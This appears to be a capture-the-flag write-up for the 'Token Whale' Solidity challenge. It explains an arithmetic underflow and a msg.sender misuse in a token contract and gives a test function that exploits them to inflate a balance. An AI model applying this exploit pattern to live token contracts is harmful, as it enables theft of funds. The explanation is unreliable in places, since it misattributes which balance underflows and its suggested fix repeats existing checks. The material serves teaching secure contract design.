# Explode Token Whale Challenge

## Overview

This repository contains the solution for the **Token Whale Challenge**, which focuses on exploiting vulnerabilities in a poorly implemented ERC20-like token contract (`TokenWhaleChallenge`) to manipulate balances and bypass restrictions. The objective is to accumulate at least **1,000,000 tokens** using any method that leverages the vulnerabilities in the contract.

---

## Key Vulnerabilities

### 1. **Arithmetic Overflow/Underflow**

The contract is written in **Solidity 0.4.25**, which lacks built-in checks for arithmetic overflow and underflow. This enables malicious actors to manipulate balances by exploiting these behaviors. For example:

- If `balanceOf[msg.sender] < value`, subtracting `value` results in a **wrap-around underflow** (`uint256` will become `2^256 - (value - balance)`).
- This underflow allows the balance to be artificially inflated to astronomically high values.

---

### 2. **Improper Use of `msg.sender` in `_transfer`**

The `_transfer` function uses `msg.sender` instead of `from` to reduce the sender's balance. This is a critical flaw:

```solidity
function _transfer(address to, uint256 value) internal {
    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;

    emit Transfer(msg.sender, to, value);
}
```

- When `_transfer` is called from `transferFrom`, `msg.sender` is the caller (e.g., `SetupContract`) rather than the actual `from` address (`Bob` in this case).
- This allows any account to manipulate balances by acting as `msg.sender`, without actually deducting tokens from the intended sender.

---

### 3. **Lack of Comprehensive Balance Checks**

The contract only includes the following checks in `transfer` and `transferFrom`:

```solidity
require(balanceOf[from] >= value);
require(balanceOf[to] + value >= balanceOf[to]);
```

- There is no additional validation to ensure that balances remain consistent or that tokens are not created out of thin air.
- Combined with the use of `msg.sender` in `_transfer`, this opens the door to multiple exploits, including manipulating balances during swaps or transfers.

---

### Exploit Strategy

#### Goal:

Exploit the above vulnerabilities to artificially inflate the `PLAYER` account's balance to exceed `1,000,000 tokens`.

#### Steps:

1. **Initial Setup:**

   - Deploy the `SetupContract` to initialize the testing environment.
   - Transfer a small portion of tokens (`500 tokens`) from `PLAYER` to `Bob`.

2. **Trigger Underflow:**

   - Use `transferFrom` to transfer more tokens than `Bob` actually has.
   - The `allowance` mechanism ensures the contract doesn’t block the transaction.
   - The balance underflow causes the `PLAYER` account’s balance to become astronomically large due to the `uint256` wrap-around.

3. **Verify Completion:**
   - After the underflow manipulation, check the `isComplete()` function.
   - The `PLAYER` balance now exceeds `1,000,000 tokens`, meeting the challenge requirements.

---

### Key Exploit Code

#### Setup and Triggering the Exploit

```solidity
function test_underflowExploit() public {
    uint256 initialBalance = token.balanceOf(PLAYER);
    uint256 transferAmount = 1100; // More than the PLAYER balance to trigger underflow

    // Step 1: Transfer a portion of tokens to Bob
    token.transfer(address(bob), initialBalance - 100);

    // Step 2: Bob approves the SetupContract to spend tokens
    bob.approveForSender(transferAmount);

    // Step 3: TransferFrom triggers underflow
    token.transferFrom(address(bob), PLAYER, transferAmount);

    // Verify the exploit succeeded
    uint256 finalBalance = token.balanceOf(PLAYER);
    assert(finalBalance >= 1_000_000); // Condition met
}
```

---

## Lessons Learned

1. **Use Updated Solidity Versions:**

   - Always use a modern version of Solidity (`>= 0.8.0`) to benefit from built-in overflow/underflow checks.

2. **Validate All Transfers:**

   - Use comprehensive checks in `transfer` and `transferFrom` functions to ensure balances remain consistent.
   - Example:
     ```solidity
     require(balanceOf[from] >= value, "Insufficient balance");
     require(balanceOf[to] + value >= balanceOf[to], "Overflow detected");
     ```

3. **Correct Usage of Parameters:**

   - Always pass explicit `from` and `to` parameters to internal transfer functions like `_transfer`. Avoid relying on `msg.sender` for logic involving external interactions.

4. **Secure Allowance Mechanisms:**
   - Limit the potential for abuse by carefully managing `approve` and `allowance` mechanisms.

---

## Conclusion

The `TokenWhaleChallenge` demonstrates the importance of secure and robust smart contract development. Exploiting outdated Solidity versions and flawed logic, attackers can manipulate balances and bypass restrictions. The exploit highlights critical practices for secure smart contract design:

- Using modern compilers.
- Implementing robust arithmetic and balance checks.
- Explicitly passing parameters to avoid misuse of `msg.sender`.
